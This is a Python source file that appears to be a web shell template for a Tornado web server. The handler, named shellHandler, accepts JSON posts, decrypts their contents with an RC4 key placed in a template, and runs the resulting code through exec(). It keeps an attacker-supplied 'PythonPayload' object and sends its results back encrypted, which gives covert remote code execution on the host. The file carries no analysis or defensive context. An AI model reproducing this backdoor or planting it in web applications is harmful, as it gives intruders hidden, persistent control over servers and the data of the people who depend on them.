async def process_request(request_data, secret_key: str, payload_name: str):
    import base64
    def rc4_encrypt_decrypt(key: str, data: bytes) -> bytes:
        s = list(range(256))
        k = [ord(key[i % len(key)]) for i in range(256)]
        j = 0
        for i in range(256):
            j = (j + s[i] + k[i]) % 256
            s[i], s[j] = s[j], s[i]
        i = j = 0
        out = bytearray(len(data))
        for idx in range(len(data)):
            i = (i + 1) % 256
            j = (j + s[i]) % 256
            s[i], s[j] = s[j], s[i]
            t = (s[i] + s[j]) % 256
            out[idx] = data[idx] ^ s[t]
        return bytes(out)
    try:
        if 'data' in request_data and request_data['data']:
            decrypted_body = rc4_encrypt_decrypt(secret_key, base64.b64decode(request_data['data']))
            if payload_name in globals():
                if hasattr(globals()[payload_name], 'process'):
                    result =  await globals()[payload_name].process(decrypted_body)
                    return {'data': base64.b64encode(rc4_encrypt_decrypt(secret_key,result)).decode('utf-8')}
            else:
                exec(decrypted_body.decode('utf-8'), globals())
                if 'PythonPayload' in globals():
                    globals()[payload_name] = globals()['PythonPayload']()
                return {'data': None}

    except Exception as e:
        pass

    return {'data': None}

import json
class shellHandler(tornado.web.RequestHandler):
    async def post(self):
        try:
            raw_data = self.request.body
            json_data = json.loads(raw_data.decode('utf-8'))
            result= await process_request(json_data,"{secretKey}","{payloadName}")
            self.write(result)
        except json.JSONDecodeError:
            self.write({"error": "Invalid JSON"})

